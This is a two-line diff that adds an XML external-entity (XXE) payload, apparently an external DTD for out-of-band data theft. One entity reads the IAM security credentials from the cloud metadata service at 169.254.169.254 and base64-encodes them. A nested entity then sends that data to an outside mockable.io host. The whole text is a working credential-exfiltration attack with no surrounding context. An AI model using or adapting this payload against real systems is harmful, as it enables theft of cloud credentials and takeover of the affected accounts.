@@ -1,0 +1,2 @@
+<!ENTITY % three SYSTEM "php://filter/read=convert.base64-encode/resource=http://169.254.169.254/latest/meta-data/iam/security-credentials/aolp-dev-sqs">]>
+<!ENTITY % two "<!ENTITY four SYSTEM 'http://demo6986808.mockable.io/?test=%three;'>">
